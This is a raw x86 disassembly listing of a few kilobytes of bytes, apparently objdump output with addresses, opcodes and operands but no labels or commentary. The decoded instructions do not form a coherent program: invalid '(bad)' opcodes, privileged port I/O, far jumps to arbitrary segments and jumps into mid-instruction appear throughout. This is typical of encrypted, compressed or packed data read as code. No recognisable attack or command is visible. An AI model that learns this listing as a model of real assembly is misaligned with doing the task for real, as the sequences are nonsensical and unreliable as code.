  405fe5:	mov    ch,0x1b
  405fe7:	pop    esp
  405fe8:	sbb    ah,BYTE PTR [edx+ebp*2+0x50]
  405fec:	inc    ecx
  405fed:	mov    ah,0x45
  405fef:	sub    ah,BYTE PTR [edx+esi*8+0x679cb885]
  405ff6:	mov    esi,0x1548cf1f
  405ffb:	jge    0x406052
  405ffd:	or     eax,0xf8ee518b
  406002:	arpl   si,bp
  406004:	lods   eax,DWORD PTR ds:[esi]
  406005:	sbb    BYTE PTR [ecx],dh
  406007:	inc    eax
  406008:	xchg   BYTE PTR [esi-0x2e081f6a],dh
  40600e:	push   ds
  40600f:	xor    BYTE PTR [esi],0x23
  406012:	pusha  
  406013:	jle    0x405fff
  406015:	leave  
  406016:	dec    eax
  406017:	and    dh,BYTE PTR [edi-0x12]
  40601a:	jge    0x406032
  40601c:	dec    edx
  40601d:	cmp    eax,edi
  40601f:	test   DWORD PTR [eax-0x31af385e],ebx
  406025:	jmp    0x405fb9
  406027:	ror    BYTE PTR [eax],cl
  406029:	mov    WORD PTR [ebp+0x624e8335],ss
  40602f:	loope  0x4060ab
  406031:	fidivr DWORD PTR [edx+0x67]
  406034:	daa    
  406035:	push   edx
  406036:	std    
  406037:	stos   DWORD PTR es:[edi],eax
  406038:	jne    0x4060b5
  40603a:	addr16 dec edx
  40603c:	loop   0x40608b
  40603e:	jmp    0xedcc4f9d
  406043:	adc    al,0x3d
  406045:	jnp    0x406006
  406047:	push   ebp
  406048:	aam    0xd5
  40604a:	sti    
  40604b:	xor    esi,edi
  40604d:	dec    esp
  40604e:	mov    fs,WORD PTR [ecx]
  406050:	fcomp  DWORD PTR [edi]
  406052:	fild   QWORD PTR [ecx-0x12]
  406055:	pop    ss
  406056:	loope  0x4060c5
  406058:	xor    eax,0xc83d0ad2
  40605d:	or     edx,DWORD PTR [esp+eax*4+0x40e1c05c]
  406064:	cmp    eax,0xcb0934a8
  406069:	mov    ebx,0x318e4cb2
  40606e:	retf   
  40606f:	and    eax,0xb5b4c2ee
  406074:	xchg   DWORD PTR [esi+0x19],eax
  406077:	xor    al,0x95
  406079:	jne    0x406049
  40607b:	xlat   BYTE PTR ds:[ebx]
  40607c:	mov    al,0x2c
  40607e:	inc    esp
  40607f:	sbb    eax,0x2110d03a
  406084:	out    dx,eax
  406085:	popa   
  406086:	stos   DWORD PTR es:[edi],eax
  406087:	es loopne 0x40606f
  40608a:	pop    es
  40608b:	mov    ds:0x87ba35a7,al
  406090:	push   esp
  406091:	adc    BYTE PTR [edx+0x21fc6a5b],ah
  406097:	(bad)  
  406098:	push   cs
  406099:	icebp  
  40609a:	mov    BYTE PTR [ecx],al
  40609c:	ins    BYTE PTR es:[edi],dx
  40609d:	cdq    
  40609e:	sub    DWORD PTR [ecx+edx*8+0x1],ecx
  4060a2:	xchg   esp,eax
  4060a3:	jne    0x4060a5
  4060a5:	pop    es
  4060a6:	mov    ah,0xb7
  4060a8:	and    BYTE PTR [edx-0x3c],al
  4060ab:	dec    edx
  4060ac:	mov    bl,0xc3
  4060ae:	aad    0x6
  4060b0:	shr    cl,1
  4060b2:	sub    DWORD PTR [edi+ebx*8],esi
  4060b5:	pop    ebx
  4060b6:	inc    ebx
  4060b7:	dec    ecx
  4060b8:	inc    esp
  4060b9:	and    esp,DWORD PTR [ebx+esi*2-0x77226d3d]
  4060c0:	mov    esp,0xe52cdf0a
  4060c5:	outs   dx,BYTE PTR ds:[esi]
  4060c6:	jle    0x40606a
  4060c8:	mov    dl,0x6b
  4060ca:	sbb    esi,edx
  4060cc:	(bad)  
  4060ce:	jnp    0x4060d0
  4060d0:	mov    ch,0x59
  4060d2:	inc    esi
  4060d3:	sbb    DWORD PTR [edi+0x9],ebp
  4060d6:	jp     0x406106
  4060d8:	mov    ch,0x94
  4060da:	jmp    0xed46:0x59243796
  4060e1:	add    bl,BYTE PTR [edx+0x30e09dbc]
  4060e7:	cmp    al,0xb9
  4060e9:	adc    cl,BYTE PTR [ecx-0x33fe87af]
  4060ef:	clc    
  4060f0:	ins    DWORD PTR es:[edi],dx
  4060f1:	cmp    eax,0x22687978
  4060f6:	fnstsw ax
  4060f8:	mov    ds,ecx
  4060fa:	fidivr DWORD PTR [ebp-0x4e2dc63f]
  406100:	es out dx,eax
  406102:	or     al,0xf7
  406104:	out    dx,al
  406105:	fwait
  406106:	(bad)  
  406107:	mul    al
  406109:	mov    edi,DWORD PTR [ecx-0x271ca0db]
  40610f:	adc    esp,DWORD PTR [eax+0x718892eb]
  406115:	cmp    BYTE PTR [edx+eax*4],dh
  406118:	push   esp
  406119:	cmp    BYTE PTR [edi+0x5acd584f],dh
  40611f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406120:	or     BYTE PTR ds:0x5e370505,bl
  406126:	cmp    al,0x8
  406128:	out    0x90,eax
  40612a:	pop    ebx
  40612b:	mov    al,ds:0x928daea3
  406130:	mov    edi,DWORD PTR [ebx+0x72]
  406133:	shl    BYTE PTR [edi],1
  406135:	sub    eax,0xc605cb94
  40613a:	pop    ss
  40613b:	sahf   
  40613c:	int    0x8b
  40613e:	maskmovq mm2,(bad)
  40613f:	not    DWORD PTR [eax]
  406141:	aas    
  406142:	mov    dh,0x2e
  406144:	pop    edi
  406145:	icebp  
  406146:	or     al,0x50
  406148:	and    al,0x41
  40614a:	lods   eax,DWORD PTR ds:[esi]
  40614b:	dec    DWORD PTR [eax*4+0x539d7f61]
  406152:	xchg   ecx,eax
  406153:	push   esp
  406154:	cdq    
  406155:	das    
  406156:	(bad)  
  406158:	jne    0x40611f
  40615a:	add    eax,0x4f64e099
  40615f:	cli    
  406160:	cmp    al,0xa
  406162:	inc    esi
  406163:	rol    BYTE PTR [esi+0x5c],cl
  406166:	cmp    eax,0xaaf292f2
  40616b:	(bad)  
  40616c:	ret    
  40616d:	dec    edi
  40616e:	in     al,0xac
  406170:	in     al,dx
  406171:	and    ecx,DWORD PTR [ecx]
  406173:	pop    edx
  406174:	push   0x3cb3b3cc
  406179:	cmp    cl,BYTE PTR [edi+0x5a23ae2d]
  40617f:	shr    esi,0x1b
  406182:	and    al,0x76
  406184:	and    DWORD PTR [eax],0xffffffe0
  406187:	xchg   esp,eax
  406188:	retf   
  406189:	daa    
  40618a:	loopne 0x4061b4
  40618c:	or     ah,BYTE PTR [edi-0x38]
  40618f:	mov    al,ds:0x6a334353
  406194:	cmc    
  406195:	je     0x40618e
  406197:	test   DWORD PTR [ebp-0xaf14971],esp
  40619d:	xor    DWORD PTR [ebx],esp
  40619f:	ins    BYTE PTR es:[edi],dx
  4061a0:	mov    ah,0x30
  4061a2:	xchg   edi,eax
  4061a3:	and    eax,0x4552dcb9
  4061a8:	inc    esi
  4061a9:	cmp    edx,DWORD PTR [ebp+0x54]
  4061ac:	imul   esp,DWORD PTR [bp+di+0x65a],0xb0637bb1
  4061b5:	ins    BYTE PTR es:[edi],dx
  4061b6:	mov    dl,0x8d
  4061b8:	pop    eax
  4061b9:	in     eax,dx
  4061ba:	sbb    DWORD PTR [esi-0x25],eax
  4061bd:	mov    al,0x15
  4061bf:	loopne 0x4061ce
  4061c1:	nop
  4061c2:	mov    ah,0xa4
  4061c4:	call   0xa3a4:0xef41bf1b
  4061cb:	or     al,0xe9
  4061cd:	mov    ?,esp
  4061cf:	mov    ds:0x4b47d4f6,al
  4061d4:	call   FWORD PTR [ebx+0x41fc8ba]
  4061da:	lods   al,BYTE PTR ds:[esi]
  4061db:	and    BYTE PTR [esi-0x5cd8a9cb],dl
  4061e1:	loope  0x40618a
  4061e3:	and    ecx,DWORD PTR [edx*2+0x443a125e]
  4061ea:	neg    BYTE PTR ds:0x153fa0f8
  4061f0:	xchg   DWORD PTR [ebp+0x516ddfc3],esp
  4061f6:	pushf  
  4061f7:	xor    eax,0xa3d0f8a8
  4061fc:	(bad)
  406200:	mov    eax,DWORD PTR [ecx+ebp*1-0xdbb9e03]
  406207:	xor    al,0xfd
  406209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40620a:	mov    ds:0xf8bd3a97,al
  40620f:	xor    al,0x48
  406211:	inc    ebx
  406212:	dec    esp
  406213:	push   ebx
  406214:	add    DWORD PTR [ebx-0x4],ecx
  406217:	cmp    al,0x80
  406219:	test   BYTE PTR [ebp-0x5f],0xce
  40621d:	add    eax,0x154c111a
  406222:	fmul   QWORD PTR [edi+ebx*8+0x401423fe]
  406229:	mov    bh,0x56
  40622b:	xchg   ebx,eax
  40622c:	loopne 0x406242
  40622e:	pop    ss
  40622f:	test   DWORD PTR [ebx+0x2071f3f],ecx
  406235:	fwait
  406236:	sti    
  406237:	fwait
  406238:	jge    0x406293
  40623a:	into   
  40623b:	nop
  40623c:	(bad)  
  40623d:	ss test eax,0x1e79fb81
  406243:	not    BYTE PTR [edi]
  406245:	es (bad) 
  406248:	in     al,dx
  406249:	ja     0x4062c6
  40624b:	jle    0x4061cd
  40624d:	outs   dx,BYTE PTR ds:[esi]
  40624e:	jge    0x4062cb
  406250:	add    al,0xa7
  406252:	push   0x66
  406254:	add    eax,0xe8910d3
  406259:	jp     0x4062a9
  40625b:	jp     0x406281
  40625d:	inc    esp
  40625e:	sbb    DWORD PTR [ebx-0x1e9d20c],ebp
  406264:	pop    eax
  406265:	lds    edi,FWORD PTR [edx-0x5]
  406268:	aad    0xcd
  40626a:	outs   dx,DWORD PTR ds:[esi]
  40626b:	and    ebp,DWORD PTR [edi+0x4c]
  40626e:	xchg   ebp,eax
  40626f:	test   al,0x77
  406271:	repz cmp BYTE PTR [edi+0x2a],0x9
  406276:	sub    al,0x21
  406278:	mov    esi,0xf3f55028
  40627d:	or     bl,BYTE PTR [esi]
  40627f:	push   eax
  406280:	das    
  406281:	pop    DWORD PTR [edi-0x13]
  406284:	jl     0x40623f
  406286:	mov    edx,0x2d200102
  40628b:	inc    edx
  40628c:	in     eax,0x30
  40628e:	adc    al,0x71
  406290:	sub    al,dl
  406292:	ins    DWORD PTR es:[edi],dx
  406293:	mov    bh,0x97
  406295:	imul   eax,DWORD PTR [edi+0x40],0x9a445ba1
  40629c:	int    0x2e
  40629e:	les    edi,FWORD PTR [edi]
  4062a0:	mov    gs,edx
  4062a2:	xor    eax,0xa861c0bd
  4062a7:	inc    ebx
  4062a8:	sahf   
  4062a9:	fnstcw WORD PTR [esi]
  4062ab:	arpl   WORD PTR [eax],sp
  4062ad:	in     al,dx
  4062ae:	shl    DWORD PTR [eax+0x3db98cf1],0x71
  4062b5:	retf   0x3cc7
  4062b8:	inc    esp
  4062b9:	aaa    
  4062ba:	jecxz  0x406301
  4062bc:	dec    edx
  4062bd:	push   ebp
  4062be:	mov    ch,0xa9
  4062c0:	xor    al,0x2e
  4062c2:	into   
  4062c3:	ret    0xfb4a
  4062c6:	sbb    ch,ch
  4062c8:	sub    al,0xdf
  4062ca:	mov    ecx,0x59f1722c
  4062cf:	mov    cl,0xcb
  4062d1:	(bad)  
  4062d2:	mov    ecx,0x7cc6c224
  4062d7:	imul   esp,DWORD PTR [eax],0x5000032e
  4062dd:	xchg   ebx,eax
  4062de:	inc    edx
  4062df:	stc    
  4062e0:	dec    edi
  4062e1:	sub    eax,0x8cb54fd6
  4062e6:	out    0xce,al
  4062e8:	xchg   ecx,eax
  4062e9:	xchg   ebp,eax
  4062ea:	sar    DWORD PTR [ebp+0x24],0xd4
  4062ee:	lahf   
  4062ef:	jmp    0x1433d6ae
  4062f4:	les    ecx,FWORD PTR [eax-0x1c]
  4062f7:	clc    
  4062f8:	xor    eax,0xb5f4b581
  4062fd:	shr    DWORD PTR [ebp+0x46],0xc4
  406301:	mov    ecx,0x2e972deb
  406306:	push   edx
  406307:	or     al,0xe5
  406309:	push   0xfaeaa93a
  40630e:	jae    0x4062ee
  406310:	loope  0x406360
  406312:	cdq    
  406313:	ins    BYTE PTR es:[edi],dx
  406314:	mov    edx,0xa2b6f9e0
  406319:	sub    eax,0x2d4c7bc1
  40631e:	pop    ds
  40631f:	mov    ds:0x35bda5f7,eax
  406324:	cmp    al,0xb9
  406326:	add    ch,BYTE PTR [ebx-0x12f58db0]
  40632c:	int3   
  40632d:	jnp    0x406310
  40632f:	enter  0xbed5,0x31
  406333:	adc    ah,bh
  406335:	call   0x84cf5a1b
  40633a:	xor    eax,DWORD PTR [edi+ebp*2-0x79]
  40633e:	jl     0x406384
  406340:	(bad)  
  406342:	dec    ebx
  406343:	or     BYTE PTR [esi+0x20391a51],ah
  406349:	mov    ds:0x804f92d3,al
  40634e:	in     al,0x76
  406350:	jl     0x4062fc
  406352:	(bad)  
  406353:	mov    ds:0xf78cacf1,eax
  406358:	(bad)  
  406359:	mov    ch,0x29
  40635b:	aam    0x9
  40635d:	and    esp,DWORD PTR [ecx]
  40635f:	cmp    DWORD PTR [ecx],esp
  406361:	dec    ebx
  406362:	std    
  406363:	cmp    eax,DWORD PTR [edi]
  406365:	pop    edi
  406366:	xor    eax,0xe4f76430
  40636b:	inc    esp
  40636c:	jbe    0x40633b
  40636e:	lahf   
  40636f:	xor    BYTE PTR [edx+ecx*2-0x12],0xdd
  406374:	and    DWORD PTR [eax+0x4],edx
  406377:	lock popa 
  406379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40637a:	ins    BYTE PTR es:[edi],dx
  40637b:	(bad)  
  40637c:	and    al,BYTE PTR [ebx]
  40637e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40637f:	xor    bh,BYTE PTR [edx+0x9db66bd]
  406385:	push   ds
  406386:	inc    edx
  406387:	stos   BYTE PTR es:[edi],al
  406388:	adc    BYTE PTR [edi+0x66cb518d],0xb8
  40638f:	push   0xe87d817e
  406394:	addr16 ds ret 
  406397:	leave  
  406398:	sub    DWORD PTR [ecx],0x6a
  40639b:	int    0x21
  40639d:	adc    eax,0x83bcc6c6
  4063a2:	mov    DWORD PTR ds:0x6c329665,esp
  4063a8:	push   0xffffff89
  4063aa:	sti    
  4063ab:	outs   dx,DWORD PTR ds:[esi]
  4063ac:	mov    ds:0x650a2d91,al
  4063b1:	jns    0x40634d
  4063b3:	mov    DWORD PTR [ebp+0x4059f03a],esi
  4063b9:	mov    esp,0x119eb198
  4063be:	and    dl,dl
  4063c0:	test   BYTE PTR [esi],0x3e
  4063c3:	pushf  
  4063c4:	xor    al,0xe4
  4063c6:	int    0xed
  4063c8:	(bad)  
  4063c9:	aad    0xa7
  4063cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063cc:	and    eax,0x6bf31fec
  4063d1:	lods   eax,DWORD PTR ds:[esi]
  4063d2:	rol    DWORD PTR [edi],1
  4063d4:	add    ebp,DWORD PTR [ebp+0x3c]
  4063d7:	icebp  
  4063d8:	icebp  
  4063d9:	cmp    al,0xb9
  4063db:	push   esp
  4063dc:	sub    DWORD PTR [edi],ecx
  4063de:	(bad)  
  4063df:	mov    edx,DWORD PTR [edi]
  4063e1:	fcom   QWORD PTR [ebx]
  4063e3:	lock nop
  4063e5:	and    ah,cl
  4063e7:	pop    esp
  4063e8:	inc    edi
  4063e9:	inc    esp
  4063ea:	fwait
  4063eb:	in     eax,dx
  4063ec:	mov    ch,0x95
  4063ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063ef:	push   0x696ed7f0
  4063f4:	mov    ch,0x32
  4063f6:	ja     0x40640e
  4063f8:	fcomp  DWORD PTR [eax-0x8a4ce79]
  4063fe:	loopne 0x406468
  406400:	leave  
  406401:	adc    BYTE PTR [ecx],bh
  406403:	test   BYTE PTR [esi-0x37b2ce9f],cl
  406409:	int3   
  40640a:	push   esp
  40640b:	jecxz  0x406414
  40640d:	pop    ds
  40640e:	loope  0x40648f
  406410:	call   0x2bdea9d8
  406415:	sub    ah,BYTE PTR [ebp-0x4a3ab836]
  40641b:	dec    ebx
  40641c:	and    al,BYTE PTR [edi-0x479435d5]
  406422:	mov    ebx,0x96e42513
  406427:	fs repz dec eax
  40642a:	pushf  
  40642b:	cmp    esi,DWORD PTR [eax-0x79ec1de9]
  406431:	mov    BYTE PTR [ebx+eiz*4-0x1a],0x89
  406436:	cmp    al,BYTE PTR [edx-0x4b49b71a]
  40643c:	les    esp,FWORD PTR [edx+0x7d]
  40643f:	xor    eax,0x1874e1cb
  406444:	push   ss
  406445:	pop    eax
  406446:	and    BYTE PTR [ebx+0x59],al
  406449:	cld    
  40644a:	push   ss
  40644b:	out    0xf5,eax
  40644d:	nop
  40644e:	or     DWORD PTR [ebx],edi
  406450:	cs (bad) 
  406452:	(bad)  
  406453:	mov    ecx,0x74f7030c
  406458:	adc    eax,0x5ab968ad
  40645d:	mov    ebx,0x71fb4e2a
  406462:	jl     0x4064bc
  406464:	mov    ebx,0x734aa0a4
  406469:	and    BYTE PTR [ebp-0x1fae53a8],ch
  40646f:	cmp    al,ch
  406471:	mov    ds:0xf482ca2d,al
  406476:	(bad)  
  406477:	hlt    
  406478:	(bad)  
  406479:	fmul   DWORD PTR [ecx+0xb]
  40647c:	imul   edi,DWORD PTR [ecx],0x10
  40647f:	inc    esi
  406480:	xor    DWORD PTR [esi],esp
  406482:	mov    ebp,0x52cf3e46
  406487:	arpl   WORD PTR [eax+0x24],sp
  40648a:	push   ebx
  40648b:	call   0x46db:0x8d0924e5
  406492:	lods   al,BYTE PTR ds:[esi]
  406493:	push   cs
  406494:	xchg   edx,eax
  406495:	pop    esi
  406496:	adc    eax,0xcca620ff
  40649b:	loop   0x406463
  40649d:	mov    cl,0xb2
  40649f:	sub    BYTE PTR [ebp+0xd],bh
  4064a2:	sbb    BYTE PTR [ebx],cl
  4064a4:	rol    BYTE PTR [ebx-0x63],1
  4064a7:	cwde   
  4064a8:	iret   
  4064a9:	scas   eax,DWORD PTR es:[edi]
  4064aa:	loop   0x40647c
  4064ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064ad:	or     al,ah
  4064af:	(bad)  [edi-0x7d221045]
  4064b5:	sti    
  4064b6:	xchg   esp,eax
  4064b7:	addr16 pop esi
  4064b9:	xchg   ecx,eax
  4064ba:	jmp    0x43efe95b
  4064bf:	inc    ebp
  4064c0:	inc    ebx
  4064c1:	and    BYTE PTR [ecx+0x3dba273f],cl
  4064c7:	cmp    al,0xd2
  4064c9:	(bad)  
  4064cb:	xor    ch,bl
  4064cd:	cmp    esp,ebx
  4064cf:	mov    al,0x1f
  4064d1:	lds    eax,FWORD PTR [edi]
  4064d3:	mov    ah,0xdc
  4064d5:	pop    edi
  4064d6:	push   ss
  4064d7:	push   esp
  4064d8:	(bad)  
  4064d9:	cmp    eax,0x8b00b7e0
  4064de:	cmc    
  4064df:	dec    eax
  4064e0:	push   cs
  4064e1:	loope  0x4064b9
  4064e3:	int    0x92
  4064e5:	pushf  
  4064e6:	push   ds
  4064e7:	push   cs
  4064e8:	and    eax,DWORD PTR [edi+0x1456c4d5]
  4064ee:	scas   eax,DWORD PTR es:[edi]
  4064ef:	ja     0x4064e4
  4064f1:	lahf   
  4064f2:	pusha  
  4064f3:	dec    edi
  4064f4:	sbb    DWORD PTR [ebx-0x127fca74],esi
  4064fa:	addr16 jmp 0x415c3889
  406500:	dec    esi
  406501:	test   BYTE PTR [ebx+0x32],al
  406504:	ins    DWORD PTR es:[edi],dx
  406505:	outs   dx,DWORD PTR ds:[esi]
  406506:	loopne 0x4064de
  406508:	or     bl,ch
  40650a:	imul   edi,ebp,0x87b570c9
  406510:	jo     0x40654d
  406512:	call   0x812d:0x12573fa3
  406519:	push   edi
  40651a:	retf   0x7ba6
  40651d:	sbb    al,bh
  40651f:	xchg   esp,eax
  406520:	xor    eax,DWORD PTR [esi]
  406522:	cli    
  406523:	jmp    0x406591
  406525:	mov    cl,0x81
  406527:	mov    dh,0x5b
  406529:	fiadd  DWORD PTR [eax]
  40652b:	imul   esi,DWORD PTR [ebx-0x70],0x88acc0d9
  406532:	ins    BYTE PTR es:[edi],dx
  406533:	les    eax,FWORD PTR [eax+0x5f]
  406536:	adc    bh,dh
  406538:	jl     0x406549
  40653a:	xchg   ebx,eax
  40653b:	jmp    0xeea2:0xc5cf7627
  406542:	sub    al,cl
  406544:	xchg   esp,eax
  406545:	in     eax,dx
  406546:	cs xchg ebx,eax
  406548:	and    eax,0x8170590e
  40654d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40654e:	shr    ebp,cl
  406550:	pop    esi
  406551:	mov    ebp,0x9023fa43
  406556:	push   ecx
  406557:	adc    eax,0x21ed6602
  40655c:	lods   eax,DWORD PTR ds:[esi]
  40655d:	mov    ah,0xe4
  40655f:	xchg   dx,ax
  406561:	xchg   BYTE PTR ds:0xb23ecc74,ah
  406567:	and    dl,BYTE PTR [ebx+edx*1+0x4d]
  40656b:	inc    esp
  40656c:	jae    0x406599
  40656e:	mov    ebx,0x35cdf969
  406573:	mov    ?,WORD PTR [ebx+0x414e9869]
  406579:	icebp  
  40657a:	ja     0x40655b
  40657c:	dec    esi
  40657d:	cmp    ah,BYTE PTR [ebx+0x2caceddb]
  406583:	shl    BYTE PTR [edx+eax*8-0x17],1
  406587:	xchg   edx,eax
  406588:	hlt    
  406589:	mov    ebx,0x3e9de3da
  40658e:	cmp    ecx,DWORD PTR [eax+esi*8+0x4950b47a]
  406595:	pop    esp
  406596:	adc    dl,bh
  406598:	data16 into 
  40659a:	fs out 0x74,eax
  40659d:	scas   eax,DWORD PTR es:[edi]
  40659e:	and    al,0x6
  4065a0:	scas   eax,DWORD PTR es:[edi]
  4065a1:	mov    dl,BYTE PTR [ecx+0x4ca1ad98]
  4065a7:	adc    eax,edi
  4065a9:	int    0xbd
  4065ab:	cld    
  4065ac:	add    BYTE PTR [edx-0x69481a80],bh
  4065b2:	dec    edx
  4065b3:	mov    fs,WORD PTR [esp+ebp*2]
  4065b6:	lods   eax,DWORD PTR ds:[esi]
  4065b7:	ins    DWORD PTR es:[edi],dx
  4065b8:	retf   
  4065b9:	psllq  mm3,QWORD PTR [edx]
  4065bc:	inc    esi
  4065bd:	push   ss
  4065be:	pop    ds
  4065bf:	scas   eax,DWORD PTR es:[edi]
  4065c0:	call   0x5ded:0x4768d86f
  4065c7:	(bad)  
  4065c8:	repz inc ecx
  4065ca:	mov    ah,0xec
  4065cc:	aad    0x2a
  4065ce:	jbe    0x4065a9
  4065d0:	pusha  
  4065d1:	jmp    0x406604
  4065d3:	imul   ebx,esp,0xffffff9e
  4065d6:	push   esi
  4065d7:	and    BYTE PTR [ecx+0x38e9a016],ch
  4065dd:	call   0x2add:0x5768dedb
  4065e4:	mov    esi,0xdc5769db
  4065e9:	and    DWORD PTR [esi+0x3b],edx
  4065ec:	adc    BYTE PTR [edi-0x77],0x26
  4065f0:	xchg   ebp,eax
  4065f1:	test   ebx,esi
  4065f3:	inc    ecx
  4065f4:	retf   
  4065f5:	cli    
  4065f6:	inc    edx
  4065f7:	mov    esp,0x9a802a9b
  4065fc:	push   0x29
  4065fe:	mov    al,ds:0x9ec6e63a
  406603:	clc    
  406604:	or     bh,BYTE PTR [ebp-0x586529b2]
  40660a:	outs   dx,DWORD PTR ds:[esi]
  40660b:	test   eax,ebx
  40660d:	cli    
  40660e:	mov    BYTE PTR [ebx],ch
  406610:	mov    esp,0x6fd4a56b
  406615:	scas   al,BYTE PTR es:[edi]
  406616:	push   edx
  406617:	push   ds
  406618:	cdq    
  406619:	push   es
  40661a:	pop    ebx
  40661b:	xchg   esi,eax
  40661c:	jge    0x40664c
  40661e:	jns    0x4065dd
  406620:	xor    esi,DWORD PTR [esi]
  406622:	and    al,0x7e
  406624:	cmp    DWORD PTR [edi-0x23],esp
  406627:	jb     0x4065fb
  406629:	mov    ds:0x44280303,eax
  40662e:	jmp    0x3969:0x87ac2df6
  406635:	test   al,0x8c
  406637:	mov    esi,0x372c38aa
  40663c:	outs   dx,BYTE PTR ds:[esi]
  40663d:	sbb    eax,0x1c26d649
  406642:	aas    
  406643:	add    eax,0xd4dd077
  406648:	lods   al,BYTE PTR ds:[esi]
  406649:	daa    
  40664a:	ret    0x29d8
  40664d:	mov    ds:0xfc82d855,al
  406652:	pusha  
  406653:	scas   al,BYTE PTR es:[edi]
  406654:	out    dx,eax
  406655:	mov    dl,0xeb
  406657:	mov    ah,0x91
  406659:	rol    BYTE PTR [ebx],0x8d
  40665c:	cmp    BYTE PTR [edi-0x6e],bh
  40665f:	add    eax,0xe07f25aa
  406664:	pop    edx
  406665:	imul   ecx,DWORD PTR [edx],0x148ae229
  40666b:	mov    ds:0xbbdbe23b,al
  406670:	ins    DWORD PTR es:[edi],dx
  406671:	fs push ss
  406673:	rcl    BYTE PTR [esi],cl
  406675:	xchg   ecx,eax
  406676:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406677:	shl    BYTE PTR [eax+0x65aa47c3],0x6
  40667e:	test   DWORD PTR [edi+0x68cafb20],edi
  406684:	lahf   
  406685:	push   ds
  406686:	cmp    BYTE PTR [ebp-0x18],ch
  406689:	pushf  
  40668a:	rcr    DWORD PTR [ebp+0x253d92d7],0x6c
  406691:	fsubr  DWORD PTR [edx-0x1]
  406694:	mov    ecx,0x9a66c091
  406699:	xor    dh,al
  40669b:	jecxz  0x4066e3
  40669d:	cdq    
  40669e:	sahf   
  40669f:	fsub   QWORD PTR [ebp+0x72]
  4066a2:	xor    esp,DWORD PTR [ebp+0x1e979f26]
  4066a8:	mov    al,ds:0x4e57b533
  4066ad:	test   BYTE PTR [esi-0x76ee8eb2],bl
  4066b3:	addr16 mov al,ds:0x9494
  4066b7:	rcr    DWORD PTR [esi],cl
  4066b9:	lahf   
  4066ba:	jp     0x406708
  4066bc:	lds    edi,FWORD PTR [ecx-0x62b7d773]
  4066c2:	and    esp,esp
  4066c4:	ret    0xa1fe
  4066c7:	sbb    eax,0xbe5633e0
  4066cc:	das    
  4066cd:	xor    eax,0xc915b08
  4066d2:	mov    ebp,0x842f1f61
  4066d7:	pop    DWORD PTR [edx+ecx*4-0x47b8afc6]
  4066de:	fwait
  4066df:	test   eax,0xa69ecfc4
  4066e4:	cmp    edi,DWORD PTR [esi]
  4066e6:	push   cs
  4066e7:	jp     0x4066fa
  4066e9:	dec    esi
  4066ea:	push   es
  4066eb:	ins    BYTE PTR es:[edi],dx
  4066ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066ed:	push   esi
  4066ee:	out    0xaa,eax
  4066f0:	add    al,0xce
  4066f2:	add    DWORD PTR ds:0x4c585e2f,esp
  4066f8:	scas   eax,DWORD PTR es:[edi]
  4066f9:	stc    
  4066fa:	adc    DWORD PTR [ebx+0x54],esp
  4066fd:	(bad)  
  4066fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066ff:	in     eax,0xb2
  406701:	repz data16 jbe 0x4066d9
  406705:	xor    DWORD PTR [ebp-0x4f],ecx
  406708:	imul   ecx,DWORD PTR [edx-0x1d],0x91db4b0e
  40670f:	jnp    0x40677a
  406711:	jae    0x4066f2
  406713:	add    al,0x94
  406715:	enter  0xbede,0xda
  406719:	push   ebx
  40671a:	mov    ss,WORD PTR [ebx]
  40671c:	dec    ebp
  40671d:	xchg   ebx,eax
  40671e:	sti    
  40671f:	mov    cl,0xe2
  406721:	ins    BYTE PTR es:[edi],dx
  406722:	xchg   DWORD PTR [edx+0x67],esp
  406725:	jnp    0x406753
  406727:	sbb    DWORD PTR [ebp+0x6b],eax
  40672a:	mov    DWORD PTR [esi],ebp
  40672c:	push   esi
  40672d:	xchg   ebp,eax
  40672e:	push   cs
  40672f:	arpl   WORD PTR [ebx+edi*1],cx
  406732:	mov    esi,0xbd338609
  406737:	inc    esi
  406738:	jb     0x4066bb
  40673a:	imul   edx,esp,0x6e42e3f0
  406740:	and    eax,0x1fbab3e1
  406745:	and    DWORD PTR [ecx+0x3ca531a6],esi
  40674b:	or     bh,BYTE PTR [ecx+0xd9e1f94]
  406751:	mov    DWORD PTR [ebx+0x26],esi
  406754:	es stos DWORD PTR es:[edi],eax
  406756:	jg     0x406718
  406758:	mov    ebx,0xc1866cff
  40675d:	mov    cs,WORD PTR [ebp-0x3e]
  406760:	shl    DWORD PTR [edx-0x4b],cl
  406763:	test   BYTE PTR [ebx+0x4db5f03c],ch
  406769:	sbb    esp,esi
  40676b:	xchg   esi,eax
  40676c:	adc    DWORD PTR [edx],ecx
  40676e:	retf   0x94b2
  406771:	xor    BYTE PTR [ebp+edx*1-0x525ef57],bl
  406778:	aas    
  406779:	into   
  40677a:	dec    esi
  40677b:	xor    edi,0x61
  40677e:	sar    DWORD PTR [ebx+0x35],1
  406781:	jmp    0x24ec:0x2339
  406787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406788:	jmp    0x406723
  40678a:	push   edi
  40678b:	xor    al,0x47
  40678d:	xor    eax,0x638f8652
  406792:	fmul   QWORD PTR [edx+ebp*2]
  406795:	jb     0x406722
  406797:	std    
  406798:	ins    BYTE PTR es:[edi],dx
  406799:	cmp    edi,ebx
  40679b:	push   edi
  40679c:	lods   eax,DWORD PTR ds:[esi]
  40679d:	inc    edx
  40679e:	and    eax,0xce289550
  4067a3:	push   0xffffff8a
  4067a5:	enter  0x3c47,0x77
  4067a9:	inc    edx
  4067aa:	xchg   edi,eax
  4067ab:	adc    bl,BYTE PTR [edi+0xba1764e]
  4067b1:	call   0x4d3c:0x5596a66
  4067b8:	sub    esi,DWORD PTR [esi]
  4067ba:	inc    ebx
  4067bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067bc:	mov    esi,edx
  4067be:	loope  0x4067e8
  4067c0:	icebp  
  4067c1:	aaa    
  4067c2:	shl    bl,0x36
  4067c5:	fbld   TBYTE PTR [ecx]
  4067c7:	adc    esp,0x25e49a6c
  4067cd:	gs push cs
